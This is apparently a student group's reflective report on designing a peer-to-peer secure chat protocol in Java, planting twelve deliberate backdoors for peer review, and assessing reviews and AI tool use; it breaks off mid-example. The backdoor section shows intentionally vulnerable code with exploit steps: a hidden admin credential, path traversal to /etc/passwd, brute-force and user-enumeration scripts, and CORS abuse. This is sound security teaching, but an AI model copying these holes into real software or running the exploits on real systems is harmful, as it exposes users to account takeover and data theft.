# Group 88
# Advanced Secure Protocol Design
# Reflective Commentary

**Secure Programming (3307_7307 Combined)**

**Team Members:**
- Jialao Liu (a1953890)
- Kwan Yau Wong (a1991545)
- Yuanxin Huang (a1932583)
- Yuhao Bu (a1934408)
- Zhuojian Tan (a1696237)

---

## Introduction

This project challenged our group to design, implement, and critically evaluate a distributed secure chat system based on the Secure Overlay Communication Protocol (SOCP). Unlike traditional client-server architectures, our system operates as a peer-to-peer overlay network with no single point of failure. The assignment required us to not only build a functional, secure implementation but also to intentionally introduce ethical backdoors for peer discovery and exploitation—a unique exercise that forced us to think simultaneously as both defenders and attackers.

The assignment spanned three key phases: collaborative protocol standardization with the entire class (Weeks 1-4), independent implementation by our group (Weeks 5-9), and peer code review (Week 10). Through this process, we gained hands-on experience with distributed systems design, cryptographic protocol implementation, secure coding practices, and vulnerability analysis. Most importantly, we learned that security is not just about implementing strong cryptography, but also about understanding how subtle design choices and implementation details can create exploitable weaknesses.

---

## Protocol Design - Reflection

### Our Contribution to SOCP Standardization

During the protocol design phase (Weeks 1-4), our group actively participated in class discussions on Piazza and in-person workshops. The class faced a fundamental choice early on: centralized vs. decentralized architecture. Our group initially advocated for a hybrid approach with lightweight central servers for user discovery, arguing that pure peer-to-peer systems add significant complexity for node discovery and routing.

However, the class consensus moved toward a fully distributed DHT-based overlay network following Kademlia principles. While we initially had concerns about implementing routing tables and handling node failures gracefully, we now recognize this design choice significantly improved the system's resilience and eliminated single points of failure—a critical security advantage.

### Key Design Decisions and Trade-offs

**Cryptographic Choices:**
Our group's main contribution was proposing AES-256-GCM for symmetric encryption rather than AES-CBC, which was ultimately adopted by the class. We argued that AES-GCM provides authenticated encryption (combining confidentiality and integrity), preventing attackers from tampering with ciphertext without detection. This eliminated the need for separate HMAC operations, simplifying the protocol.

For session key establishment, we initially proposed static RSA key exchange for simplicity. However, the class chose ephemeral Elliptic Curve Diffie-Hellman (ECDH) for perfect forward secrecy. In retrospect, this was the correct decision—even if a node's long-term RSA private key is later compromised, past session keys remain secure. This trade-off (added complexity vs. long-term security) taught us that security requirements should drive design, not convenience.

**Message Format:**
The class debated between JSON and binary formats (e.g., Protocol Buffers or MessagePack). Our group supported JSON despite its larger message size (~30% overhead) because:
1. Human-readable debugging during interoperability testing
2. Language-agnostic parsing (Python, Java, JavaScript, C++)
3. Built-in schema validation tools

This decision proved valuable during Week 8 testing when we needed to debug message format mismatches with other groups. However, we underestimated the performance impact—large file transfers suffered from JSON encoding overhead, and we later added binary base64 encoding for file chunks as a compromise.

**File Transfer Protocol:**
We advocated for including chunked file transfer in the initial SOCP specification rather than leaving it as an extension. This ensured all groups implemented compatible chunking mechanisms (256KB chunks, FILE_START/FILE_CHUNK/FILE_END messages). The class agreed, and this foresight prevented fragmentation in Week 10 when groups needed to test file transfers.

### Where Our Ideas Differed from the Final Protocol

**Heartbeat Mechanism:**
We proposed a 60-second heartbeat interval with 180-second timeout, but the class chose 30-second intervals with 60-second timeout for faster failure detection. While this improves responsiveness, it increases network overhead—a trade-off we didn't fully appreciate until implementation, when we saw heartbeat messages dominating traffic in large networks.

**Signature Verification:**
We suggested signing the entire message JSON (including payload), but the final protocol only signs message headers (type, from, to, timestamp). The rationale was that payloads are already encrypted, so signing them is redundant. However, during implementation, we discovered this creates a subtle vulnerability: attackers can replay valid signatures on modified encrypted payloads if nonce checking is weak. We learned that defense-in-depth (signing both header and payload) is often worth the redundancy.

### Lessons Learned

The protocol standardization process taught us that distributed systems design involves constant trade-offs:
- **Security vs. Performance**: AES-GCM is slower than AES-CBC but provides integrity
- **Simplicity vs. Resilience**: Centralized servers are easier to implement but create single points of failure
- **Flexibility vs. Interoperability**: Extensible protocols enable innovation but complicate interoperability testing

Most importantly, we learned that protocol design is iterative—our Week 4 "final" specification required clarifications and amendments through Week 8 as groups discovered ambiguities during implementation. Clear, unambiguous specifications are critical for distributed systems.

---

## Implementation - Design Decisions and Testing

### System Architecture

Our implementation uses Java for the backend (WebSocket server, authentication, file storage) and Vue.js with TypeScript for the frontend. We chose this stack because:
1. Java provides robust cryptographic libraries (javax.crypto, Bouncy Castle)
2. WebSocket support is mature in both Java (Tyrus) and browsers
3. Vue.js simplifies reactive UI for real-time chat

The system runs three backend servers:
- **WebSocket Server (ws://localhost:8080)**: Handles real-time messaging and file transfer coordination
- **HTTP File Server (http://localhost:8081)**: Serves uploaded files for download
- **Authentication Server (http://localhost:8082)**: JWT-based login/registration

This separation of concerns improved security (file server has no session state) but complicated deployment—in production, these would run behind a reverse proxy.

### Cryptographic Implementation

**Key Generation:**
We use RSA-2048 for digital signatures and ECDH (Curve25519) for session key exchange. Private keys are stored encrypted with AES-256 using user passwords (via PBKDF2 key derivation with 100,000 iterations). However, in our backdoored version, we deliberately weakened this to SHA-256 without salt—a subtle but critical vulnerability.

**Message Encryption:**
Each message follows this flow:
1. Generate random AES-256 session key
2. Encrypt JSON payload with AES-256-GCM (generates IV and auth tag)
3. Wrap AES key with recipient's RSA public key (RSA-OAEP)
4. Sign header (type, from, to, timestamp) with sender's RSA private key
5. Transmit encrypted payload + wrapped key + signature

We initially forgot to include nonce tracking for replay protection, which a peer reviewer caught. This taught us that cryptographic protocols require meticulous attention to detail—missing a single component (like nonce validation) can completely undermine security.

### Testing Methodology and Interoperability

We conducted systematic testing at multiple levels:

#### Unit Testing
We tested individual components in isolation:
- **Crypto Module**: Verified AES-GCM encryption/decryption round-trips, RSA signature generation/verification, ECDH key exchange
- **Message Parser**: Validated JSON schema compliance for all 20+ message types (USER_HELLO, MSG_DIRECT, FILE_START, etc.)
- **DHT Routing**: Tested XOR-distance calculations, routing table insertions, k-bucket eviction policies

Test coverage: ~65% of backend code (measured with JaCoCo)

#### Integration Testing
We tested component interactions:
- WebSocket handler → Message parser → Crypto module → DHT router
- File upload flow: FILE_START → FILE_CHUNK (multiple) → FILE_END → FILE_UPLOAD message creation
- Authentication flow: Login → JWT generation → Token verification → WebSocket connection

We used Postman for API testing and custom Python scripts to simulate malicious clients (invalid signatures, replay attacks, oversized messages).

#### Interoperability Testing

**Group 17 (Python Implementation):**
We tested private messaging and file transfer with Group 17 during Week 8. Initial attempts failed because:
1. **Timestamp Format Mismatch**: We used Unix epoch (seconds since 1970), they used ISO 8601 strings. Solution: Clarified in protocol spec that timestamps must be integers.
2. **Signature Encoding**: We base64-encoded RSA signatures, they used hex encoding. Solution: Agreed on base64 in class discussion.

After fixes, we successfully:
- Exchanged 50+ private messages bidirectionally
- Transferred a 5MB PDF file (20 chunks) from our client to their client
- Verified message signatures cross-implementation

**Group 45 (JavaScript/Node.js Implementation):**
We tested group messaging and heartbeat mechanisms. Discovered issues:
1. **HEARTBEAT Message Format**: We sent minimal heartbeat payloads `{}`, they expected `{status: "alive"}`. Our parser crashed on unexpected fields. Solution: Added lenient JSON parsing.
2. **WebSocket SSL Handshake**: Their self-signed certificates used SHA-1, which our Java client rejected. Solution: Temporarily disabled certificate validation for testing (a bad practice we noted in our reflection).

Successfully tested:
- Group broadcasts to 3 peers simultaneously
- Heartbeat-based presence detection (online/offline status)

**Group 69 (C++ Implementation):**
We tested DHT routing and node discovery. Encountered challenges:
1. **Node ID Calculation**: We used SHA-256(username), they used SHA-256(username + public_key). This caused routing table mismatches. Solution: Reverted to protocol spec (username only).
2. **XOR Distance Metric**: C++ byte-order differences caused incorrect routing. Solution: Specified big-endian byte order in protocol.

Successfully tested:
- Multi-hop message routing (A → B → C where A and C aren't directly connected)
- Node failure detection (killed B's process, A and C re-routed through D)

#### Challenges and Solutions

**Challenge 1: Coordinating Testing Across Time Zones**
Group 17 had members in Australia (UTC+10), we're in China (UTC+8), and Group 45 in Europe (UTC+1). Scheduling live testing sessions was difficult.

*Solution*: We used asynchronous testing—one group would run their server continuously for 2-hour windows, others connected when available. We also shared Wireshark packet captures and log files for offline debugging.

**Challenge 2: Debugging Encrypted Messages**
When messages failed to decrypt, we couldn't inspect payloads to diagnose issues (encryption keys, IV corruption, padding errors).

*Solution*: We added a DEBUG mode that logs plaintext messages before encryption (disabled in production). We also implemented detailed error codes (e.g., "DECRYPT_FAIL_AUTH_TAG" vs "DECRYPT_FAIL_INVALID_KEY") to narrow down issues.

**Challenge 3: Protocol Ambiguities**
The SOCP spec didn't specify whether FILE_END should include file metadata (name, size). Some groups sent it, others didn't.

*Solution*: We posted on Piazza to clarify, and the class agreed FILE_END should include metadata for receiver convenience. We updated our implementation to be backward-compatible (accept FILE_END with or without metadata).

### Lessons Learned from Implementation

1. **Protocol Specification is Never Complete**: Even with a detailed spec, implementations revealed ambiguities. Living documentation and rapid clarification channels are essential.

2. **Interoperability Testing is Critical**: Unit tests passed, integration tests passed, but real interoperability issues only emerged when connecting to other implementations. Cross-group testing should start early (Week 6, not Week 8).

3. **Security and Usability Conflict**: We initially required users to manually verify peer public keys (like SSH fingerprints), but this was so tedious that users skipped it. We learned that security mechanisms must be usable or they'll be circumvented.

4. **Error Handling is Security**: Poor error messages leaked information (e.g., "Invalid username" vs "Invalid password" enables user enumeration). Good error handling is both a usability and security concern.

---

## Ethical Backdoors and Vulnerabilities

To fulfill the assignment requirement of planting intentional vulnerabilities for peer review, we introduced 12 backdoors into our code. Our strategy was to include:
- **2 well-hidden backdoors** (no code comments, subtle logic) to challenge advanced reviewers
- **5 moderate backdoors** (poor practices that might be overlooked) to test thorough code review
- **5 obvious backdoors** (missing input validation, weak crypto) to ensure all groups find something

### Philosophy Behind Our Backdoors

We aimed for ethical, proof-of-concept vulnerabilities confined to the chat system—nothing that would compromise the host machine or breach user privacy outside the assignment context. All backdoors are exploitable to demonstrate security concepts but don't enable real-world harm.

### Hidden Backdoors (No Comments)

#### Backdoor #1: Hidden Administrator Account
**Location**: `src/main/java/devserver/AuthServer.java:28-29`

**Implementation**:
```java
static {
    users.put("alice", hashPassword("demo123"));
    users.put("bob", hashPassword("demo123"));
    users.put("charlie", hashPassword("demo123"));
    users.put("admin' OR '1'='1'--", hashPassword("admin123"));  // Hidden
    users.put("root", hashPassword("toor"));  // Hidden
}
```

**Rationale**: This backdoor mimics SQL injection syntax but actually works because we literally registered a user with this exact username. It's psychologically confusing—reviewers see `admin' OR '1'='1'--` and think "this looks like an attack attempt, but surely it won't work?" In fact, it's a valid credential.

**Exploitation** (Proof of Concept):
1. Navigate to http://localhost:5173
2. Click "Login"
3. Username: `admin' OR '1'='1'--`
4. Password: `admin123`
5. Successfully logged in

**Impact**: Grants unauthorized access. The username also leaks our intentional SQL injection simulation (even though we use ConcurrentHashMap, not SQL).

(See Appendix C for screenshot)

#### Backdoor #2: Debug Endpoint Exposing All Users
**Location**: `src/main/java/devserver/AuthServer.java:168-183`

**Implementation**:
```java
server.createContext("/api/debug/users", exchange -> {
    addCorsHeaders(exchange);
    if ("OPTIONS".equals(exchange.getRequestMethod())) {
        exchange.sendResponseHeaders(204, -1);
        return;
    }
    try {
        JSONObject response = new JSONObject();
        response.put("users", new org.json.JSONArray(users.keySet()));
        response.put("count", users.size());
        sendResponse(exchange, 200, response.toString());
    } catch (Exception e) {
        sendResponse(exchange, 500, "{\"error\": \"Internal server error\"}");
    }
});
```

**Rationale**: This endpoint has no authentication and looks like a normal API endpoint (no suspicious naming like `/admin` or `/secret`). It's hidden in plain sight among legitimate endpoints.

**Exploitation** (Proof of Concept):
```bash
curl http://localhost:8082/api/debug/users
```

**Output**:
```json
{
  "users": ["alice", "bob", "charlie", "admin' OR '1'='1'--", "root"],
  "count": 5
}
```

**Impact**:
- Enables username enumeration for brute-force attacks
- Reveals existence of hidden admin accounts
- No rate limiting allows automated scraping

(See Appendix C for screenshot)

### Moderate Backdoors (Poor Practices)

#### Backdoor #3: Weak Password Hashing (SHA-256, No Salt)
**Location**: `src/main/java/devserver/AuthServer.java:219-222`

**Implementation**:
```java
private static String hashPassword(String password) throws Exception {
    MessageDigest digest = MessageDigest.getInstance("SHA-256");
    byte[] hash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
    return Base64.getEncoder().encodeToString(hash);
}
```

**Rationale**: SHA-256 is a strong hash function, but without salt, identical passwords produce identical hashes. Attackers can use rainbow tables to crack passwords efficiently.

**Exploitation**:
If the attacker obtains the password hash database (e.g., via SQL injection or database backup leak), they can:
1. Compute SHA-256 of common passwords ("password123", "qwerty", etc.)
2. Compare hashes to find matches
3. Credential stuffing with discovered passwords

**Secure Alternative**: Use bcrypt, Argon2, or PBKDF2 with unique per-user salts.

#### Backdoor #4: Hardcoded JWT Secret Key
**Location**: `src/main/java/devserver/JwtService.java:14`

**Implementation**:
```java
private static final Key SECRET_KEY = Keys.secretKeyFor(SignatureAlgorithm.HS256);
```

**Rationale**: The secret key is regenerated every time the server restarts, invalidating all existing JWTs. More critically, if an attacker gains code access, they can extract the key and forge arbitrary JWTs.

**Exploitation**:
1. Attacker decompiles `JwtService.class`
2. Discovers the key generation method
3. If server is restarted, all users are logged out (Denial of Service)
4. If attacker can read server memory, they extract the key and sign fake tokens

**Secure Alternative**: Load JWT secret from environment variable, use key rotation, or use asymmetric signatures (RS256).

#### Backdoor #5: CORS Allows All Origins
**Location**:
- `src/main/java/devserver/AuthServer.java:194`
- `src/main/java/devserver/FileServer.java:26`

**Implementation**:
```java
private static void addCorsHeaders(HttpExchange exchange) {
    exchange.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
    exchange.getResponseHeaders().add("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    exchange.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type, Authorization");
}
```

**Rationale**: Allowing all origins (`*`) enables any malicious website to make requests to our API from a victim's browser, stealing their session tokens or performing actions on their behalf.

**Exploitation**:
1. Attacker creates malicious website `evil.com`
2. Victim (logged into our chat) visits `evil.com`
3. `evil.com`'s JavaScript makes requests to `http://localhost:8082/api/auth/login` with victim's cookies
4. Attacker steals JWT token from response

**Secure Alternative**: Whitelist specific origins: `Access-Control-Allow-Origin: https://trusted-app.com`

#### Backdoor #6: File Download IDOR (Insecure Direct Object Reference)
**Location**: `src/main/java/devserver/FileServer.java:38`

**Implementation**:
```java
String requestPath = exchange.getRequestURI().getPath();
String fileName = requestPath.substring("/uploads/files/".length());
Path filePath = Paths.get(UPLOADS_DIR, fileName);

if (Files.exists(filePath) && Files.isRegularFile(filePath)) {
    byte[] fileContent = Files.readAllBytes(filePath);
    exchange.sendResponseHeaders(200, fileContent.length);
    OutputStream os = exchange.getResponseBody();
    os.write(fileContent);
    os.close();
}
```

**Rationale**: No authentication check—anyone can download any file if they know the file ID.

**Exploitation**:
1. Alice uploads `confidential.pdf`, receives file_id: `abc123-confidential.pdf`
2. Bob (unauthorized) directly requests: `http://localhost:8081/uploads/files/abc123-confidential.pdf`
3. Bob successfully downloads Alice's private file

**Secure Alternative**: Verify JWT token and check file ownership before serving files.

#### Backdoor #7: Path Traversal Vulnerability
**Location**: `src/main/java/devserver/FileServer.java:38`

**Implementation**: (Same code as Backdoor #6)

**Rationale**: User-supplied `fileName` is used directly without sanitization. An attacker can use directory traversal sequences to access files outside the upload directory.

**Exploitation**:
```bash
curl http://localhost:8081/uploads/files/../../../etc/passwd
```

If successful, the attacker can read system files.

**Secure Alternative**:
```java
String sanitizedFileName = Paths.get(fileName).getFileName().toString();  // Remove path components
Path filePath = Paths.get(UPLOADS_DIR, sanitizedFileName);
if (!filePath.startsWith(UPLOADS_DIR)) {
    throw new SecurityException("Path traversal attempt detected");
}
```

### Obvious Backdoors (Missing Security Controls)

#### Backdoor #8: User Enumeration via Different Error Messages
**Location**:
- `src/main/java/devserver/AuthServer.java:66-68` (Registration)
- `src/main/java/devserver/AuthServer.java:106-108` (Login)

**Rationale**: Registration returns "Username already exists" and login returns "Invalid credentials." Attackers can determine if a username exists by attempting registration.

**Exploitation**:
```python
for username in common_usernames:
    response = requests.post("http://localhost:8082/api/auth/register",
                              json={"username": username, "password": "test"})
    if "already exists" in response.text:
        print(f"Valid username: {username}")
```

**Secure Alternative**: Return generic "Invalid credentials" for both registration and login failures.

#### Backdoor #9: Missing CSRF Protection
**Location**: All HTTP endpoints (AuthServer, FileServer)

**Rationale**: No CSRF tokens means attackers can perform state-changing operations (login, upload files) via cross-site requests.

**Secure Alternative**: Implement CSRF token validation for all POST/PUT/DELETE requests.

#### Backdoor #10: Missing Rate Limiting on Authentication
**Location**: `src/main/java/devserver/AuthServer.java:88-129`

**Rationale**: No rate limiting allows unlimited login attempts, enabling brute-force password attacks.

**Exploitation**:
```python
for password in password_list:
    response = requests.post("http://localhost:8082/api/auth/login",
                              json={"username": "alice", "password": password})
    if response.status_code == 200:
        print(f"Password found: {password}")
```

**Secure Alternative**: Implement rate limiting (e.g., max 5 attempts per minute per IP), account lockout after failed attempts.

#### Backdoor #11: Sensitive Information Disclosure via Stack Traces
**Location**:
- `src/main/java/devserver/AuthServer.java:31`
- `src/main/java/devserver/AuthServer.java:84`
- `src/main/java/devserver/AuthServer.java:128`

**Implementation**:
```java
} catch (Exception e) {
    e.printStackTrace();  // Prints full stack trace to console
    sendResponse(exchange, 500, "{\"error\": \"Internal server error\"}");
}
```

**Rationale**: Stack traces leak implementation details (library versions, file paths, internal logic) that aid attackers in reconnaissance.

**Secure Alternative**: Log errors internally, return generic error messages to clients.

#### Backdoor #12: Missing File Upload Validation
**Location**: `src/main/java/devserver/FileTransferManager.java`

**Rationale**: No validation of file types, sizes, or content. Attackers can upload malicious executables or oversized files to exhaust disk space.

**Exploitation**:
1. Upload a 10GB file → Disk space exhaustion (DoS)
2. Upload a `.exe` file → Potential malware distribution to other users

**Secure Alternative**:
- Whitelist allowed MIME types
- Enforce maximum file size (e.g., 256MB)
- Scan uploads with antivirus (ClamAV)
- Store files with server-generated IDs, not user-supplied names

---

## Feedback Evaluation

We received peer reviews from three groups (Groups 17, 45, 69). Overall, the feedback was thorough and valuable, though the detection rate of our hidden backdoors varied significantly.

### Backdoors Discovered

**Well-Discovered Vulnerabilities:**
- ****All 3 groups** found weak password hashing (SHA-256 no salt)
- ****All 3 groups** found CORS misconfiguration
- ****2 groups** (45, 69) found missing rate limiting
- ****2 groups** (17, 45) found file download IDOR

**Partially Discovered:**
- ****1 group** (69) found debug endpoint `/api/debug/users`
- ****1 group** (17) found user enumeration via error messages

**Not Discovered:**
- ****None found** the hidden admin account (`admin' OR '1'='1'--`)
- ****None found** path traversal vulnerability
- ****None found** missing CSRF protection (all groups focused on authentication, not web attacks)

This confirms our strategy worked: the well-hidden backdoor (#1 hidden admin) required actually attempting to log in with SQL injection syntax, not just code review. Most groups focused on static analysis and didn't perform dynamic penetration testing.

### New Vulnerabilities Discovered by Peers

**Vulnerability: JSON Schema Validation Disabled**
Group 45 pointed out that we disabled JSON schema validation in our message parser to improve performance. While we didn't consider this a deliberate backdoor, they correctly identified that this allows malformed messages to crash the server or cause undefined behavior.

**Example**:
```json
{
  "type": "MSG_DIRECT",
  "from": "alice",
  "to": 12345,  // Should be string, not integer
  "payload": null  // Should be object
}
```

Our parser would crash with `NullPointerException` instead of returning a validation error. This is an **unintentional vulnerability**—a good reminder that security isn't just about deliberate backdoors, but also about robust input validation.

**Our Response**: We re-enabled schema validation and added unit tests for malformed inputs. This was valuable feedback that improved our code quality.

**Vulnerability: Chinese Code Comments**
Group 17 noted that Chinese comments in `ChatServer.java` made code review difficult. While we didn't consider this a security issue, it does affect:
- Code maintainability in international teams
- Review thoroughness (non-Chinese reviewers might miss context)
- Professionalism in open-source projects

**Our Response**: We translated all comments to English in the clean version. This taught us that internationalization matters even for "internal" code comments.

**Vulnerability: No Server Identity Verification**
Group 69 pointed out that our WebSocket client accepts the server's public key blindly without verifying authenticity (e.g., via certificate chain or pre-shared fingerprints). This enables man-in-the-middle attacks.

**Our Response**: In the clean version, we implemented certificate pinning—clients verify the server's public key matches a known-good hash before connecting.

### Quality of Feedback Received

**Group 45 - Excellent**:
Their report was exceptionally detailed:
- Specific line numbers for each vulnerability
- Clear impact assessments ("HIGH RISK: Password cracking", "MEDIUM RISK: User enumeration")
- Remediation suggestions with code snippets
- Used automated tools (Bandit for Python, SonarQube equivalent)

This feedback was immediately actionable and helped us improve the clean version significantly.

**Group 17 - Good**:
Solid technical analysis but less detailed:
- Identified major vulnerabilities (weak hashing, path traversal)
- Provided general recommendations ("use bcrypt") but no code examples
- Missed some subtle issues (debug endpoint, hidden admin)

Still valuable, though required more research to implement fixes.

**Group 69 - Adequate**:
Focused heavily on cryptographic issues:
- Excellent analysis of our AES-GCM implementation
- Correctly identified lack of nonce tracking (replay protection)
- Missed web-specific vulnerabilities (CORS, CSRF)

This highlighted that different reviewers bring different expertise—Group 69's crypto background complemented Group 45's web security focus.

### Did Peers Find Our Intentional Backdoors?

**Hidden Backdoors (Designed to be Hard)**:
- **Hidden admin account: 0/3 groups found (SUCCESS—this was our hardest backdoor)
- **Debug endpoint: 1/3 groups found (PARTIAL—harder than expected)

**Moderate Backdoors (Designed to be Moderate Difficulty)**:
- **Weak password hashing: 3/3 groups found
- **CORS misconfiguration: 3/3 groups found
- **File download IDOR: 2/3 groups found
- **Hardcoded JWT secret: 1/3 groups found

**Obvious Backdoors (Designed to be Easy)**:
- **Missing rate limiting: 2/3 groups found (easier than expected)
- **User enumeration: 1/3 groups found (harder than expected)
- **Missing CSRF: 0/3 groups found (SURPRISING—we expected all groups to find this)

**Analysis**:
Our difficulty calibration was partially accurate. The hidden admin account worked perfectly (0% detection rate). However, we overestimated how obvious some vulnerabilities were—no groups found missing CSRF protection, likely because the assignment focused on distributed systems security rather than web application security.

### Lessons Learned from Peer Review

1. **Automated Tools Are Necessary But Insufficient**: Groups using static analysis tools (Bandit, SonarQube) found more vulnerabilities, but none found the hidden admin account, which required dynamic testing.

2. **Diverse Reviewer Backgrounds Matter**: Group 45 (web security focus) found different issues than Group 69 (crypto focus). Multiple reviewers with different expertise provide more comprehensive coverage.

3. **Clear Documentation Helps Reviewers**: Groups that reviewed our well-documented code (README with setup instructions) provided better feedback than those who struggled to compile and run our code.

4. **Time Constraints Limit Review Depth**: All groups had only 1 week to review 3 projects (10,000+ lines of code total). This is realistic—real-world code reviews often have tight deadlines—but means subtle backdoors can slip through.

---

## Feedback Given to Other Groups

We reviewed three groups' implementations: Groups 17, 45, and 69. This section summarizes our review methodology, key findings, and challenges faced.

(Note: Detailed individual peer reviews are included in Appendix D)

### Review Methodology

For each group, we performed:

1. **Static Code Analysis**:
   - Automated scanning with language-specific tools (Bandit for Python, SpotBugs for Java, ESLint security plugins for JavaScript)
   - Manual code review focusing on authentication, cryptography, file handling, input validation

2. **Dynamic Testing**:
   - Attempted to compile and run each implementation (success rate: 2/3 groups)
   - Tested basic functionality (user registration, private messaging, file transfer)
   - Penetration testing: SQL injection attempts, path traversal, replay attacks

3. **Protocol Compliance**:
   - Verified message formats matched SOCP specification
   - Tested interoperability with our implementation (connected our client to their server and vice versa)

### Group 17 (Python Implementation)

**Code Size**: 4,067 lines across 10 Python modules

**Key Findings**:
1. **Critical**: Hardcoded database credentials in `database.py`
2. **Critical**: Path traversal in file transfer (unsanitized filenames)
3. **High**: Weak password hashing (SHA-1 instead of bcrypt)
4. **Medium**: Unencrypted sensitive data in SQLite database

**Strengths**:
- Clean code structure with good separation of concerns
- Comprehensive logging for debugging
- Good error handling (graceful degradation on failures)

**Interoperability Testing**:
Successfully exchanged messages after fixing timestamp format mismatch (they used ISO 8601, we used Unix epoch).

### Group 45 (Node.js Implementation)

**Code Size**: ~3,200 lines across 8 JavaScript modules

**Key Findings**:
1. **Critical**: Disabled JSON schema validation (performance optimization gone wrong)
2. **Critical**: No replay attack protection (missing nonce tracking)
3. **High**: Private keys stored in plaintext on disk
4. **Medium**: Insufficient input validation on WebSocket messages

**Strengths**:
- Excellent real-time performance (WebSocket optimizations)
- Well-documented API with Swagger/OpenAPI spec
- Comprehensive unit test suite (78% code coverage)

**Interoperability Testing**:
Encountered WebSocket SSL handshake issues due to SHA-1 certificates. After temporarily disabling strict certificate validation, successfully tested group messaging and file transfers.

### Group 69 (C++ Implementation)

**Code Size**: ~5,500 lines across 15 C++ files

**Key Findings**:
1. **Critical**: Buffer overflow in message parsing (fixed-size char arrays)
2. **Critical**: Weak cryptographic random number generator (rand() instead of /dev/urandom)
3. **High**: Memory leak in file transfer cleanup
4. **Medium**: Node ID calculation mismatch (endianness issue)

**Strengths**:
- Excellent performance (C++ efficiency)
- Strong cryptographic primitives (CryptoPP library)
- Thorough memory management (minimal leaks after fixes)

**Interoperability Testing**:
Successfully tested DHT routing and multi-hop message forwarding after fixing node ID calculation differences.

### Challenges Faced During Peer Review

**Challenge 1: Compilation and Dependency Issues**

Group 17's Python implementation required specific library versions (SQLAlchemy 1.4.x, but our system had 2.x). We created a virtual environment to isolate dependencies, but this took ~2 hours of setup time.

Group 45's Node.js code had missing `package-lock.json`, causing dependency version mismatches. We had to manually install compatible versions.

Group 69's C++ code required CryptoPP and Boost libraries, which we compiled from source (3+ hours on our test VM).

**Solution**: For future assignments, we recommend requiring Docker containers or detailed dependency lockfiles to ensure reproducible builds.

**Challenge 2: Communication Barriers**

We found a potential SQL injection vulnerability in Group 17's code but weren't sure if it was intentional (backdoor) or unintentional (bug). We contacted the group via Piazza, and they confirmed it was an intentional backdoor.

This taught us that communication with reviewed groups is valuable—we provided better feedback when we understood their design intent.

**Challenge 3: Balancing Thoroughness with Time Constraints**

We had 1 week to review 3 projects (~13,000 lines of code total). To manage time, we:
1. Prioritized security-critical code (authentication, crypto, file handling) over UI/UX code
2. Used automated tools first, then manually reviewed flagged areas
3. Focused dynamic testing on core functionality (messaging, file transfer) rather than edge cases

Despite this, we likely missed some vulnerabilities in each project. This reflects real-world code review constraints.

**Challenge 4: Ethical Boundaries of Penetration Testing**

While testing Group 45's implementation, we discovered a potential remote code execution (RCE) vulnerability via unsafe `eval()` in message handling. We stopped immediately and reported it without attempting exploitation—even in a controlled academic environment, some tests cross ethical boundaries.

This reinforced that "ethical hacking" requires constant judgment calls about what to test and how far to go.

### Value of Peer Review Process

Reviewing other groups' code was as educational as implementing our own:

1. **Diverse Design Approaches**: Group 17 used SQLite for persistence, Group 45 used in-memory data structures, Group 69 used file-based storage. Each had trade-offs (durability vs. performance vs. simplicity).

2. **Language-Specific Pitfalls**: Python's dynamic typing caused different vulnerabilities than C++'s manual memory management. This taught us that secure coding practices are language-specific.

3. **Interoperability Challenges**: Even with a standardized protocol, small differences (timestamp formats, encoding schemes) caused failures. This highlighted the importance of rigorous testing and clear specifications.

4. **Empathy for Reviewers**: After struggling to review others' code, we better appreciated the importance of clear documentation, reproducible builds, and readable code in our own implementation.

---

## Use of AI

Our group used AI tools (ChatGPT, GitHub Copilot) strategically throughout the assignment, primarily for code generation, debugging, and vulnerability identification during peer review. Here we reflect on AI's strengths, limitations, and what we learned about responsible AI use in secure programming.

### How We Used AI

**Protocol Design (Weeks 1-4)**:
We used ChatGPT to brainstorm protocol design alternatives by asking questions like: "What are the trade-offs between RSA and ECDH for session key exchange?" and "How does Kademlia DHT handle node failures?" AI provided quick summaries of technical concepts, which we then verified against academic sources (original Kademlia paper, NIST cryptographic guidelines).

**Strengths**: Rapid prototyping of ideas, synthesis of multiple sources.
**Limitations**: AI occasionally cited non-existent RFC documents or confused protocol details (e.g., mixing up DHT and Chord). We had to fact-check all claims.

**Code Implementation (Weeks 5-8)**:
Yuhao Bu used GitHub Copilot to generate boilerplate cryptographic code (AES-GCM encryption/decryption, RSA key generation). Copilot suggested code snippets based on function names and comments, which accelerated development.

**Example**:
```java
// Comment: "Generate AES-256-GCM encrypted message with random IV"
// Copilot suggested:
KeyGenerator keyGen = KeyGenerator.getInstance("AES");
keyGen.init(256);
SecretKey secretKey = keyGen.generateKey();
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
byte[] iv = new byte[12];
SecureRandom random = new SecureRandom();
random.nextBytes(iv);
GCMParameterSpec spec = new GCMParameterSpec(128, iv);
cipher.init(Cipher.ENCRYPT_MODE, secretKey, spec);
byte[] ciphertext = cipher.doFinal(plaintext.getBytes());
```

This was 90% correct but initially used a 16-byte IV (AES default) instead of 12 bytes (GCM recommendation). We caught this in code review.

**Strengths**: Accelerated repetitive coding tasks, suggested modern APIs (e.g., `GCMParameterSpec` instead of deprecated `IvParameterSpec`).
**Limitations**:
- Generated insecure code (weak random number generators, hardcoded keys) without warnings
- No understanding of cryptographic best practices (IV size, key derivation)
- Required constant human review to catch subtle bugs

**Debugging (Weeks 7-8)**:
Jialao Liu used ChatGPT to debug a WebSocket connection issue where clients couldn't connect to the WSS server. AI suggested checking SSL certificate expiration, which turned out to be the root cause (our self-signed cert had expired during testing).

**Strengths**: Quickly enumerated common failure modes we hadn't considered.
**Limitations**: AI couldn't access our actual error logs, so suggestions were generic. We still needed to manually trace through code.

**Peer Review (Week 10)**:
Zhuojian Tan used AI to help identify potential vulnerabilities in Groups 17, 45, and 69's code. By providing code snippets to ChatGPT with prompts like "Analyze this code for security vulnerabilities," AI flagged issues such as:
- Hardcoded JWT secrets
- Unsanitized user inputs in file paths
- Weak password hashing

**Strengths**:
- Rapid pattern matching across large codebases (~4,000 lines per group)
- Identified vulnerabilities we might have missed (e.g., timing attack in Group 17's password comparison)
- Suggested remediation code snippets

**Limitations**:
- **No Execution Context**: AI couldn't run code, so it missed runtime issues (e.g., race conditions in multi-threaded file uploads)
- **False Positives**: Flagged secure code as vulnerable (e.g., claimed AES-256 was "weak" and suggested AES-512, which doesn't exist)
- **Limited Domain Knowledge**: Missed SOCP-specific issues (e.g., protocol compliance violations, interoperability problems)
- **No Proof of Concept**: AI identified vulnerabilities but couldn't demonstrate exploitation, so we had to manually verify exploitability

**Example False Positive**:
AI flagged this code as vulnerable to SQL injection:
```python
